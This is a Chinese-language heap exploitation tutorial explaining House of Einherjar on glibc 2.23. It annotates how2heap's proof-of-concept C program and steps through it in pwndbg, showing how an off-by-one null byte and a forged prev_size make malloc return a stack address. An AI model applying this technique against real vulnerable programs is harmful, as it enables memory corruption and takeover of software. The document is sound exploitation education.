## House of Einherjar

### 讲解一下house of einherjar中利用的机制
* **Off by One**，指的就是溢出一个字节的漏洞，虽然只有一个字节的溢出，但是在堆利用里面非常有用。

在chunk的size域，最低一个字节里面有几个标志位，其中最关键的是最低的`PREV_INUSE`位，
这个位标识了**当前chunk的上一个chunk是否处于使用状态**
当我们通过**Off by One**机制，将该标志位置为0的时候，会启用prev_size。
这时候如果我们把**prev_size改成我们伪造的chunk到当前chunk的间隔**，
再free当前chunk，会启动consolidate操作，把上一个chunk与当前chunk合并。
但是他是**按照prev_size去寻找上一个chunk的**，所以我们就拿到我们伪造的chunk了，之后可以更改目标地址。

### 实例展示：
我们采用glibc_2.23版本的how2heap里面house_of_einherjar.c作为例子展示该机制
```c
// how2heap/glibc_2.23/house_of_einherjar.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <malloc.h>

/*
   Credit to st4g3r for publishing this technique
   The House of Einherjar uses an off-by-one overflow with a null byte to control the pointers returned by malloc()
   This technique may result in a more powerful primitive than the Poison Null Byte, but it has the additional requirement of a heap leak. 
*/

int main()
{
	setbuf(stdin, NULL);
	setbuf(stdout, NULL);

	printf("Welcome to House of Einherjar!\n");
	printf("Tested in Ubuntu 16.04 64bit.\n");
	printf("This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.\n");

	uint8_t* a;
	uint8_t* b;
	uint8_t* d;

	printf("\nWe allocate 0x38 bytes for 'a'\n");
	a = (uint8_t*) malloc(0x38); // 为什么要malloc(0x38)这种末尾带个0x8的chunk，因为这样可以把下一个chunk的prev_size域作为用户区，相当于是共用。这在a块处于被分配状态是可行的
	printf("a: %p\n", a);
	
	int real_a_size = malloc_usable_size(a); // 这里展示的时候也是0x38
	printf("Since we want to overflow 'a', we need the 'real' size of 'a' after rounding: %#x\n", real_a_size);

	// create a fake chunk
	printf("\nWe create a fake chunk wherever we want, in this case we'll create the chunk on the stack\n");
	printf("However, you can also create the chunk in the heap or the bss, as long as you know its address\n");
	printf("We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks\n");
	printf("(although we could do the unsafe unlink technique here in some scenarios)\n");

	size_t fake_chunk[6];  // 这里在我们想要更改的目标地址附近构造fake chunk，这里我们就拿栈上的地址做例子

	fake_chunk[0] = 0x00; // The prev_size vs. size check is of no concern, until GLIBC 2.26 P->bk->size == P->prev_size check
	fake_chunk[1] = 0x00; // Arbitrary value; fake_chunk->size is ignored during backward consolidation.
	fake_chunk[2] = (size_t) fake_chunk; // fwd
	fake_chunk[3] = (size_t) fake_chunk; // bck
	fake_chunk[4] = (size_t) fake_chunk; //fwd_nextsize
	fake_chunk[5] = (size_t) fake_chunk; //bck_nextsize


	printf("Our fake chunk at %p looks like:\n", fake_chunk); // 这里的构造如英文讲解所述，主要是为了通过unlink检查
	printf("prev_size (not used): %#lx\n", fake_chunk[0]);
	printf("size: %#lx\n", fake_chunk[1]);
	printf("fwd: %#lx\n", fake_chunk[2]);
	printf("bck: %#lx\n", fake_chunk[3]);
	printf("fwd_nextsize: %#lx\n", fake_chunk[4]);
	printf("bck_nextsize: %#lx\n", fake_chunk[5]);

	/* In this case it is easier if the chunk size attribute has a least significant byte with
	 * a value of 0x00. The least significant byte of this will be 0x00, because the size of 
	 * the chunk includes the amount requested plus some amount required for the metadata. */
	b = (uint8_t*) malloc(0xf8);
	int real_b_size = malloc_usable_size(b);

	printf("\nWe allocate 0xf8 bytes for 'b'.\n");
	printf("b: %p\n", b);

	uint64_t* b_size_ptr = (uint64_t*)(b - 8); // 回到size域
	/* This technique works by overwriting the size metadata of an allocated chunk as well as the prev_inuse bit*/

	printf("\nb.size: %#lx\n", *b_size_ptr);
	printf("b.size is: (0x100) | prev_inuse = 0x101\n"); // 因为b上面是a，所以prev inuse位是1
	printf("We overflow 'a' with a single null byte into the metadata of 'b'\n");
	a[real_a_size] = 0; // a[0x38]正好到b的size域的第一个字节，也就是最低字节，现在改成0了，那prev inuse位也被置为0了，就可以进行house of einherjar利用了
	printf("b.size: %#lx\n", *b_size_ptr);
	printf("This is easiest if b.size is a multiple of 0x100 so you "
		   "don't change the size of b, only its prev_inuse bit\n");
	printf("If it had been modified, we would need a fake chunk inside "
		   "b where it will try to consolidate the next chunk\n");

	// Write a fake prev_size to the end of a
	printf("\nWe write a fake prev_size to the last %lu bytes of a so that "
		   "it will consolidate with our fake chunk\n", sizeof(size_t));
	size_t fake_size = (size_t)((b-sizeof(size_t)*2) - (uint8_t*)fake_chunk); // 我们要让当前chunk在backward consolidate的时候指针指到fake chunk那里，就要把b的prev size改成两个指针之间的差距
	printf("Our fake prev_size will be %p - %p = %#lx\n", b-sizeof(size_t)*2, fake_chunk, fake_size);
	*(size_t*)&a[real_a_size-sizeof(size_t)] = fake_size;  // 在这里改的prev size

	//Change the fake chunk's size to reflect b's new prev_size
	printf("\nModify fake chunk's size to reflect b's new prev_size\n");
	fake_chunk[1] = fake_size; // 把fake chunk的size也改成这个gap

	// free b and it will consolidate with our fake chunk
	printf("Now we free b and this will consolidate with our fake chunk since b prev_inuse is not set\n");
	free(b); // 把b释放，成功实现consolidate，b指针应该现在指向fake chunk了
	printf("Our fake chunk size is now %#lx (b.size + fake_prev_size)\n", fake_chunk[1]);

	//if we allocate another chunk before we free b we will need to 
	//do two things: 
	//1) We will need to adjust the size of our fake chunk so that
	//fake_chunk + fake_chunk's size points to an area we control
	//2) we will need to write the size of our fake chunk
	//at the location we control. 
	//After doing these two things, when unlink gets called, our fake chunk will
	//pass the size(P) == prev_size(next_chunk(P)) test. 
	//otherwise we need to make sure that our fake chunk is up against the
	//wilderness

	printf("\nNow we can call malloc() and it will begin in our fake chunk\n");
	d = malloc(0x200); // malloc拿到地址应该是从刚才那个fake chunk上面分割下来一块给d使用，所以指针地址应该就是fake_chunk+0x10
	printf("Next malloc(0x200) is at %p\n", d);
}
```

我们拿gdb动态调试一下看看中间的具体过程：
1. 先构造一个0x38的块，记住一定是以0x8结尾的，这样才能共用到下一个chunk的prev size区域，off by one才能改掉下一个chunk的prev inuse标志位
```bash
pwndbg> b 32
Breakpoint 2 at 0x5555555552d9: file glibc_2.23/house_of_einherjar.c, line 34.
pwndbg> c
Continuing.
Welcome to House of Einherjar!
Tested in Ubuntu 16.04 64bit.
This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.

We allocate 0x38 bytes for 'a'
a: 0x555555559010
Since we want to overflow 'a', we need the 'real' size of 'a' after rounding: 0x38

pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x555555559000
Size: 0x40 (with flag bits: 0x41)

Top chunk | PREV_INUSE
Addr: 0x555555559040
Size: 0x20fc0 (with flag bits: 0x20fc1)
```
2. 再malloc一个块，size任意，然后利用a数组索引改掉a[0x38]位置为0，这样prev inuse位就被置为0了
```bash
pwndbg> b 78
Breakpoint 3 at 0x5555555554dd: file glibc_2.23/house_of_einherjar.c, line 80.
pwndbg> c
Continuing.

We create a fake chunk wherever we want, in this case we'll create the chunk on the stack
However, you can also create the chunk in the heap or the bss, as long as you know its address
We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks
(although we could do the unsafe unlink technique here in some scenarios)
Our fake chunk at 0x7fffffffde40 looks like:
prev_size (not used): 0
size: 0
fwd: 0x7fffffffde40
bck: 0x7fffffffde40
fwd_nextsize: 0x7fffffffde40
bck_nextsize: 0x7fffffffde40

We allocate 0xf8 bytes for 'b'.
b: 0x555555559050

b.size: 0x101
b.size is: (0x100) | prev_inuse = 0x101
We overflow 'a' with a single null byte into the metadata of 'b'
b.size: 0x100
This is easiest if b.size is a multiple of 0x100 so you don't change the size of b, only its prev_inuse bit
If it had been modified, we would need a fake chunk inside b where it will try to consolidate the next chunk

pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x555555559000
Size: 0x40 (with flag bits: 0x41)

Allocated chunk
Addr: 0x555555559040
Size: 0x100 (with flag bits: 0x100) 可以看到这里，上一个chunk明明还在使用，但是flag bit已经是0了

Top chunk | PREV_INUSE
Addr: 0x555555559140
Size: 0x20ec0 (with flag bits: 0x20ec1)
```
3. 更改prev size域，改为目标地址到这个bchunk的距离
```bash
pwndbg> b 87
Breakpoint 4 at 0x55555555554a: file glibc_2.23/house_of_einherjar.c, line 87.
pwndbg> c
Continuing.

We write a fake prev_size to the last 8 bytes of a so that it will consolidate with our fake chunk
Our fake prev_size will be 0x555555559040 - 0x7fffffffde40 = 0xffffd5555555b200 这是我们计算出来的距离

pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x555555559000
Size: 0x40 (with flag bits: 0x41)

Allocated chunk
Addr: 0x555555559040
Size: 0x100 (with flag bits: 0x100)

Top chunk | PREV_INUSE
Addr: 0x555555559140
Size: 0x20ec0 (with flag bits: 0x20ec1)

pwndbg> x/2gx 0x555555559040
0x555555559040:	0xffffd5555555b200	0x0000000000000100 可以看到prev size这里已经被修改掉了，成了上面计算出的距离
```
4. free掉b，实施backward consolidate(consolidate机制请看fastbin attack里面part2)
```bash
pwndbg> b 95
Breakpoint 5 at 0x555555555597: file glibc_2.23/house_of_einherjar.c, line 106.
pwndbg> c
Continuing.

Modify fake chunk's size to reflect b's new prev_size
Now we free b and this will consolidate with our fake chunk since b prev_inuse is not set
Our fake chunk size is now 0xffffd5555557c1c1 (b.size + fake_prev_size) 这里之所以变成这个数而不是简单的b_size+prev_size,是因为把top chunk也给consolidate进来了

```
5. 最后malloc一下，就是从这个fake chunk上面切割了，拿到的指针就是那个fake_chunk+0x10位置的地址了,成功拿到目标地址
```bash
pwndbg> b 109
Breakpoint 6 at 0x5555555555d4: file glibc_2.23/house_of_einherjar.c, line 109.
pwndbg> c
Continuing.

Now we can call malloc() and it will begin in our fake chunk
Next malloc(0x200) is at 0x7fffffffde50

pwndbg> p/x (size_t)fake_chunk
$2 = 0x7fffffffde40
```

* **值得注意的是，在glibc-2.26版本及更高版本，引入了tcache机制，那就需要先填满tcache或者分配大于等于0x408的chunk来利用该机制，详情见how2heap/glibc_2.27/house_of_einherjar.c**

